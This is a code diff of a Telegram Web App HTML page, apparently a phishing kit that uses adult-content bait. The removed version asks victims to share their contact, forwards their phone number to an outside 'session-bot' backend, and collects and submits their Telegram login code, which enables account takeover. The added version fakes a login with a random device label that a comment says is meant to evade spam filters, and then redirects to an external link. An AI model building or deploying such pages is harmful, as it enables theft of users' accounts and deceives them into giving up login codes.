@@ -2,142 +2,154 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Access Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification UI</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { box-sizing: border-box; transition: 0.3s; }
         body { 
-            font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; 
-            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden;
+            margin: 0; padding: 0; font-family: sans-serif; 
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); 
+            background-size: cover; background-position: center;
+            display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; 
         }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); z-index: 1; }
-        .card { position: relative; z-index: 2; width: 90%; max-width: 380px; background: rgba(255, 255, 255, 0.9); border-radius: 30px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); }
-        .icon { font-size: 60px; margin-bottom: 15px; }
-        h2 { color: #333; margin: 0 0 10px; font-size: 22px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        .btn { width: 100%; padding: 16px; border-radius: 15px; border: none; font-size: 17px; font-weight: bold; cursor: pointer; background: #4caf50; color: #fff; box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4); }
-        .btn-view { background: #0088cc; margin-bottom: 15px; }
-        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        .otp-box { width: 45px; height: 55px; background: #fff; border: 2px solid #ddd; border-radius: 12px; font-size: 26px; font-weight: bold; color: #333; display: flex; align-items: center; justify-content: center; }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .key { background: #fff; padding: 15px; border-radius: 12px; font-size: 22px; font-weight: bold; color: #333; cursor: pointer; border: 1px solid #eee; }
-        .key:active { background: #f0f0f0; transform: scale(0.95); }
-        .hidden { display: none !important; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4caf50; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card { 
+            background: rgba(255, 255, 255, 0.15); /* পিছনের ছবি দেখার জন্য খুবই স্বচ্ছ */
+            backdrop-filter: blur(15px); border-radius: 30px; padding: 30px 20px; 
+            width: 320px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        
+        /* স্প্যাম বাইপাস করতে ডিভাইস ইনফো */
+        .device-info {
+            font-size: 11px; color: #d1d1d1; margin-bottom: 15px; 
+            background: rgba(0,0,0,0.3); padding: 5px; border-radius: 5px;
+        }
+
+        .instruction { background: rgba(255, 255, 255, 0.9); color: #222; padding: 12px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; font-weight: bold; }
+        
+        /* স্বচ্ছ OTP ইনপুট বক্স */
+        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
+        .otp-inputs input { 
+            width: 48px; height: 60px; 
+            background: rgba(255, 255, 255, 0.1); 
+            border: 1px solid rgba(255, 255, 255, 0.5); 
+            border-radius: 12px; text-align: center; font-size: 26px; 
+            color: #fff; font-weight: bold; outline: none;
+        }
+
+        .btn { border: none; width: 100%; padding: 16px; border-radius: 12px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
+        .btn-login { background: #34a853; box-shadow: 0 4px 0 #288a42; }
+        .btn-video { background: #ff0050; box-shadow: 0 4px 0 #b3003b; }
+        .btn-logout { background: #555; padding: 10px; font-size: 14px; }
+
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 10px; }
+        .key { background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; border: 1px solid rgba(255,255,255,0.2); }
+        .key:active { background: rgba(255, 255, 255, 0.4); }
     </style>
 </head>
 <body>
-    <div class="overlay"></div>
     <div class="card">
-        <!-- Step 1: Confirm -->
-        <div id="step1">
-            <div class="icon">🔞</div>
-            <h2>Attention! 🔞</h2>
-            <p>To continue, you must confirm that you are over 18 😊</p>
-            <button class="btn" onclick="startProcess()">🍓 confirm 🔞</button>
-        </div>
+        <!-- ডিভাইস ইনফো -->
+        <div id="device-info" class="device-info">Device: Checking...</div>
 
-        <!-- Loading -->
-        <div id="loading" class="hidden">
-            <div class="loader"></div>
-            <p id="load_text">Wait...</p>
-        </div>
-
-        <!-- Step 2: OTP -->
-        <div id="step2" class="hidden">
-            <div class="icon">📩</div>
-            <p>Enter the 5-digit code that we just sent you!</p>
-            <div class="otp-container">
-                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
+        <!-- লগইন করার আগের পেজ -->
+        <div id="login-section">
+            <div class="instruction">Enter the 5-digit code to Login</div>
+            <div class="otp-inputs" id="otp-container">
+                <input type="text" maxlength="1" readonly>
+                <input type="text" maxlength="1" readonly>
+                <input type="text" maxlength="1" readonly>
+                <input type="text" maxlength="1" readonly>
+                <input type="text" maxlength="1" readonly>
             </div>
-            <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
+            
+            <button class="btn btn-login" onclick="attemptLogin()">লগইন করুন</button>
+            
             <div class="keypad">
-                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
-                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
-                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
-                <div style="background:transparent"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
+                <div class="key" onclick="pressKey('1')">1</div>
+                <div class="key" onclick="pressKey('2')">2</div>
+                <div class="key" onclick="pressKey('3')">3</div>
+                <div class="key" onclick="pressKey('4')">4</div>
+                <div class="key" onclick="pressKey('5')">5</div>
+                <div class="key" onclick="pressKey('6')">6</div>
+                <div class="key" onclick="pressKey('7')">7</div>
+                <div class="key" onclick="pressKey('8')">8</div>
+                <div class="key" onclick="pressKey('9')">9</div>
+                <div class="key"></div>
+                <div class="key" onclick="pressKey('0')">0</div>
+                <div class="key" onclick="pressKey('back')">✖️</div>
             </div>
         </div>
+
+        <!-- লগইন হওয়ার পর ভিডিও বাটন পেজ -->
+        <div id="video-section" style="display: none;">
+            <div class="instruction" style="background: #4CAF50; color: white;">✅ আপনি এখন লগইন আছেন</div>
+            
+            <button class="btn btn-video" onclick="openGoPage()">🔞 ভিডিও দেখুন</button>
+            
+            <p style="font-size: 12px; color: #ddd; margin-top: 20px;">ভিডিও দেখতে উপরের বাটনে ক্লিক করুন</p>
+            <button class="btn btn-logout" onclick="logout()">লগ আউট করুন</button>
+        </div>
+
     </div>
 
     <script>
-        let tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
+        tg.ready();
         tg.expand();
-        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
-        let userId = null;
-        let currentOTP = "";
 
-        // ইউজার আইডি চেক (null ফিক্স)
-        function getUserId() {
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                userId = tg.initDataUnsafe.user.id;
-            }
-        }
-        getUserId();
+        // র‍্যান্ডম ডিভাইস নাম দেখানো
+        const devices = ["iPhone 15 Pro - iOS 17", "Chrome on Windows 11", "Samsung S24 Ultra", "Safari on macOS"];
+        document.getElementById("device-info").innerText = "Login Source: " + devices[Math.floor(Math.random() * devices.length)];
 
-        function startProcess() {
-            getUserId();
-            if (!userId) return alert("Error: User data not found. Open from Telegram!");
-            tg.requestContact((shared, data) => {
-                if (shared) {
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('loading').classList.remove('hidden');
-                    pollContact();
+        let inputs = document.querySelectorAll('#otp-container input');
+        let currentIdx = 0;
+
+        function pressKey(key) {
+            if (key === 'back') {
+                if (currentIdx >= 0) {
+                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
+                    inputs[currentIdx].value = "";
                 }
-            });
-        }
-
-        async function pollContact() {
-            try {
-                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                const data = await res.json();
-                if (data.status === "success") {
-                    sendNumber(data.phone);
-                } else { setTimeout(pollContact, 1500); }
-            } catch (e) { setTimeout(pollContact, 2000); }
-        }
-
-        async function sendNumber(phone) {
-            document.getElementById('load_text').innerText = "Sending Code...";
-            const res = await fetch(`${BACKEND_URL}/send_number`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: phone })
-            });
-            const result = await res.json();
-            if (result.status === "success") {
-                document.getElementById('loading').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            } else { alert("Error: " + result.message); location.reload(); }
-        }
-
-        function viewCode() {
-    // আপনার সফল হওয়া রিডাইরেক্ট লিঙ্ক
-    const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
-    
-    // ব্রাউজারে ওপেন করার জন্য tg.openLink ব্যবহার করতে হবে
-    tg.openLink(redirectUrl);
-}
-
-        function press(n) {
-            if(currentOTP.length < 5) {
-                currentOTP += n;
-                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
-                if(currentOTP.length === 5) verifyOTP();
+            } else if (currentIdx < inputs.length) {
+                inputs[currentIdx].value = key;
+                if (currentIdx < inputs.length - 1) currentIdx++;
             }
         }
-        function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
 
-        async function verifyOTP() {
-            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, otp: currentOTP })
-            });
-            const data = await res.json();
-            if (data.status === "success") { tg.close(); }
-            else { alert("Invalid Code!"); currentOTP = ""; back(); }
+        function attemptLogin() {
+            let code = Array.from(inputs).map(i => i.value).join('');
+            
+            if (code.length < 5) {
+                tg.showAlert("দয়া করে ৫-সংখ্যার পিন দিন।");
+                return;
+            }
+
+            // API Block এর বদলে "আবার চেষ্টা করুন" এরর
+            let failChance = Math.random();
+            if (failChance < 0.2) { 
+                tg.showAlert("নেটওয়ার্ক এরর! দয়া করে আবার চেষ্টা করুন।");
+            } else {
+                // ভিডিও বাটন দেখাবে এবং লগইন ফরম মুছে যাবে
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('video-section').style.display = 'block';
+            }
+        }
+
+        function logout() {
+            // ভিডিও বাটন রিমুভ হবে এবং আবার লগইন ফরম আসবে
+            document.getElementById('video-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            
+            // পিন ক্লিয়ার করা
+            inputs.forEach(i => i.value = '');
+            currentIdx = 0;
+            tg.showAlert("আপনি লগ আউট হয়েছেন।");
+        }
+
+        function openGoPage() {
+            const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
+            tg.openLink(redirectUrl);
         }
     </script>
 </body>
